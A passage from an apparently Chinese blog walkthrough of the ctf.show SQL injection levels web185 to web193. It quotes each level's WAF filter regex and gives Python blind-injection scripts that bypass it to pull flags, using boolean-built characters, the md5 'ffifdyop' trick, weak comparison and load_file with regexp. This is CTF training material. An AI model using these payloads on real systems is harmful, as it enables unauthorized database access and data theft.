function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这一次将数字也进行了过滤，再次卡住了，看了其他师傅们的博客和群主的视频才知道可以利用字符来构造数字，在mysql中可以知道是true=1，true+true=2，那么通过相加便可以构造出任意的数字，同时可以通过concat来连接字母</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>  <span class="token operator">=</span><span class="token operator">></span>  <span class="token number">1</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span>  <span class="token operator">=</span><span class="token operator">></span>  <span class="token number">11</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token boolean">true</span><span class="token operator">+</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token operator">+</span><span class="token boolean">true</span><span class="token punctuation">)</span>  <span class="token operator">=</span><span class="token operator">></span>  <span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以继续上一题的脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://4e79aa3a-008f-4736-bf6f-12462a1fa7be.challenge.ctf.show/select-waf.php"</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token string">"&#123;&#125;-1234567890qwertyuiopasdfghjklzxcvbnm"</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow"</span><span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> a <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> a<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">char_to_boolean</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>    temp <span class="token operator">=</span> <span class="token string">"char("</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> temp <span class="token operator">+</span> <span class="token string">"true+"</span>    <span class="token keyword">return</span> temp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"),"</span><span class="token keyword">def</span> <span class="token function">formatstr</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token string">"concat("</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> temp <span class="token operator">+</span> char_to_boolean<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">return</span> temp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">")"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>        str1 <span class="token operator">=</span>formatstr<span class="token punctuation">(</span>flag <span class="token operator">+</span> j <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"ctfshow_user group by pass having pass like &#123;0&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>        <span class="token comment">#print(data)</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token comment">#print(res.text)</span>        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag <span class="token operator">+</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"+++++++++wrong"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h4 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\>|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>虽然在上一题的基础上又多增加了一些过滤，但发现对上一题的payload依旧无影响，继续使用上一题的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://f4fd7dc1-141f-4500-a159-e5e7be85d477.challenge.ctf.show/select-waf.php"</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token string">"&#123;&#125;-1234567890qwertyuiopasdfghjklzxcvbnm"</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow"</span><span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> a <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> a<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">char_to_boolean</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>    temp <span class="token operator">=</span> <span class="token string">"char("</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> temp <span class="token operator">+</span> <span class="token string">"true+"</span>    <span class="token keyword">return</span> temp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"),"</span><span class="token keyword">def</span> <span class="token function">formatstr</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token string">"concat("</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> temp <span class="token operator">+</span> char_to_boolean<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">return</span> temp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">")"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>        str1 <span class="token operator">=</span>formatstr<span class="token punctuation">(</span>flag <span class="token operator">+</span> j <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"ctfshow_user group by pass having pass like &#123;0&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>        <span class="token comment">#print(data)</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token comment">#print(res.text)</span>        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag <span class="token operator">+</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"+++++++++wrong"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h4 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h4><p>这一次是有登录框的了</p><p>返回逻辑</p><pre class="line-numbers language-none"><code class="language-none">$username &#x3D; $_POST[&#39;username&#39;];$password &#x3D; md5($_POST[&#39;password&#39;],true);&#x2F;&#x2F;只有admin可以获得flagif($username!&#x3D;&#39;admin&#39;)&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;用户名不存在&#39;;    die(json_encode($ret));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到password是经过了md5加密的，同时因为第二个参数为true，所以返回的是一个16位二进制，</p><p>而有一个特殊的字符串ffifdyop，经过 md5(“ffifdyop”,true); 返回的是’or’ 6(后面是一些不可见字符)，成功作为了一个万能密码，输入提交后，在返回包中拿到了flag</p><h4 id="web-188"><a href="#web-188" class="headerlink" title="web_188"></a>web_188</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#123;$username&#125;&quot;;     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>返回逻辑</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;用户名检测if(preg_match(&#39;&#x2F;and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#39;|\&quot;&#x2F;i&#39;, $username))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;  die(json_encode($ret));&#125;&#x2F;&#x2F;密码检测if(!is_numeric($password))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;密码只能为数字&#39;;  die(json_encode($ret));&#125;&#x2F;&#x2F;密码判断if($row[&#39;pass&#39;]&#x3D;&#x3D;intval($password))&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;    array_push($ret[&#39;data&#39;], array(&#39;flag&#39;&#x3D;&gt;$flag));  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先看到的是sql语句是通过检索username来查询pass的，而在sql语句中检索时为弱比较，如果令username=0，那么只要是username字段里的内容是以首字母开头的，那么也就会被强制转化为0，从而达到0=0；再来看到密码判断这里，也是一个弱比较，令password为0，那么同理可得，绕过了if判断语句，本地测试以下:</p><p><img src="/images/web_188.png"></p><p>如果username不是以首字母开头的，那么就需要用到||运算符，回到本题上：</p><p>令username=0&amp;pass=0，提交上去，发现登录成功，在返回包中拿到flag</p><h4 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h4><p>首先看到的提示是flag在/api/index.php，无疑感觉又是一个新的知识点，再次去到大佬们发的wp需要用到两个sql函数</p><p><strong>LOAD_FILE(file_name)：</strong> 读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。</p><p><strong>regexp：</strong> mysql中的正则表达式操作符</p><p>需要通过load_file来ex配合regexp进行盲注，首先需要知道是它的默认路径，很容易想到”/var/www/html/api/index.php”,然后因为将username=0&amp;password=0，显示密码错误，说明不再是以字母开头的了，所以可以通过是否显示密码错误来判断flag中的字符，python脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://d8b930e3-c5a3-4689-bb70-ef21d6ca4697.challenge.ctf.show/api/index.php"</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token string">"&#123;&#125;1234567890qwerty-uiopasdfghjklzxcvbnm"</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"if(load_file('/var/www/html/api/index.php')regexp('&#123;0&#125;'),0,1)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span><span class="token number">0</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">r"\u5bc6\u7801\u9519\u8bef"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag <span class="token operator">+</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"wrong"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h4><p>来到布尔盲注了，用户登录有两种提示，分别为密码错误和用户名不存在，所以可以通过这两种不同的页面提示来进行布尔盲注，这里就直接拿群主给的脚本跑了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://eb10e675-47ac-44bf-8c00-b6fc6758b105.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">127</span>    <span class="token builtin">min</span> <span class="token operator">=</span> <span class="token number">32</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">max</span><span class="token operator">+</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">min</span> <span class="token operator">==</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token comment">#payload = "admin'and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#".format(i,mid)</span>        <span class="token comment">#ctfshow_web</span>        <span class="token comment">#payload = "admin'and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#".format(i,mid)</span>        <span class="token comment">#ctfshow_fl0g</span>        <span class="token comment">#payload = "admin'and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),&#123;&#125;,1))&lt;&#123;&#125;)#".format(i,mid)</span>        <span class="token comment">#id,f1ag</span>        payload <span class="token operator">=</span> <span class="token string">"admin'and (ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token builtin">max</span> <span class="token operator">=</span> mid        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">min</span> <span class="token operator">=</span> mid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h4 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h4><pre class="line-numbers language-none"><code class="language-none">if(preg_match(&#39;&#x2F;file|into|ascii&#x2F;i&#39;, $username))&#123;        $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;        die(json_encode($ret));    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这一次在上一题的基础上将ascii函数给过滤了，但还可以用ord函数，脚本如下;</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://7b724992-d4d4-48eb-92fc-26c2b6730247.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">127</span>    <span class="token builtin">min</span> <span class="token operator">=</span> <span class="token number">32</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">max</span><span class="token operator">+</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">min</span> <span class="token operator">==</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token comment">#payload = "admin'and (ord(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#".format(i,mid)</span>        <span class="token comment">#ctfshow_web</span>        <span class="token comment">#payload = "admin'and (ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#".format(i,mid)</span>        <span class="token comment">#ctfshow_fl0g</span>        <span class="token comment">#payload = "admin'and (ord(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),&#123;&#125;,1))&lt;&#123;&#125;)#".format(i,mid)</span>        <span class="token comment">#id,f1ag</span>        payload <span class="token operator">=</span> <span class="token string">"admin'and (ord(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token builtin">max</span> <span class="token operator">=</span> mid        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">min</span> <span class="token operator">=</span> mid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><p>、</p><h4 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h4><pre class="line-numbers language-none"><code class="language-none">if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex&#x2F;i&#39;, $username))&#123;        $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;        die(json_encode($ret));    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这一次又增加了ord函数等，但可以用正则匹配：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://68d3acf9-c16e-46de-8e51-73aea422d994.challenge.ctf.show/api/"</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token string">"&#123;&#125;1234567890qwerty-uiopasdfghjklzxcvbnm"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>        <span class="token comment">#payload = f"admin'and if(substr((select database()),&#123;&#125;,1))regexp('&#123;j&#125;'),1,0)=1#"</span>        <span class="token comment">#ctfshow_web</span>        <span class="token comment">#payload = f"admin'and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))regexp('&#123;j&#125;'),1,0)=1#"</span>        <span class="token comment">#ctfshow_fl0g</span>        <span class="token comment">#payload = f"admin'and if(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),&#123;&#125;,1))regexp('&#123;j&#125;'),1,0)=1#"</span>        <span class="token comment">#id,f1ag</span>        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"admin'and if(substr((select f1ag from ctfshow_fl0g),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">'),1,0)=1#"</span></span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token number">1</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">r"\u5bc6\u7801\u9519\u8bef"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag <span class="token operator">+</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"wrong"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h4 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h4><pre class="line-numbers language-none"><code class="language-none">if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex|substr&#x2F;i&#39;, $username))&#123;        